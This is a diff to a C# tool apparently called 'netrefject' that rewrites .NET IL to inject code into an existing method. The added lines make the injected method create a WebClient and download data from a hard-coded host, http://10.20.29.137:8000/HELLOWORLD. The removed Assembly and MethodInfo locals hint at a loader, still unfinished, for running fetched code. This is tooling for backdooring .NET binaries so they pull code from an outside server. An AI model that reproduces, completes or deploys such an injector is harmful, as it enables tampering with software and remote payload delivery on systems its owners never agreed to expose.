@@ -425,12 +425,8 @@ namespace netrefject
 
 
             m1.Body.InitLocals = true;
-            m1.Body.MaxStackSize = 10;
-
-            m1.Body.Variables.Add(new VariableDefinition(m1.Module.ImportReference(typeof(WebClient))));
             m1.Body.Variables.Add(new VariableDefinition(refs.uint8));
-            m1.Body.Variables.Add(new VariableDefinition(refs.Assembly));
-            m1.Body.Variables.Add(new VariableDefinition(refs.MethodInfo));
+            m1.Body.Variables.Add(new VariableDefinition(refs.var));
 
 
             /* Insert Variables
@@ -480,11 +476,15 @@ namespace netrefject
             ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
             ilp.Append(Instruction.Create(OpCodes.Nop));
             ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
+            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
+            //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
+
+            ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137:8000/HELLOWORLD"));
+            ilp.Append(Instruction.Create(OpCodes.Call, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
             ilp.Append(Instruction.Create(OpCodes.Stloc_0));
             //ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
 
-            ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137:8000/HELLOWORLD"));
-            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
+            //ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
             //ilp.Append(Instruction.Create(OpCodes.Call, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
             //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
             //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
@@ -501,7 +501,8 @@ namespace netrefject
             ilp.Append(Instruction.Create(OpCodes.Nop));*/
 
             //Add our new ret
-            ilp.Append(ilp.Create(OpCodes.Ret));            
+            ilp.Append(ilp.Create(OpCodes.Ret));     
+
             return;
 
 
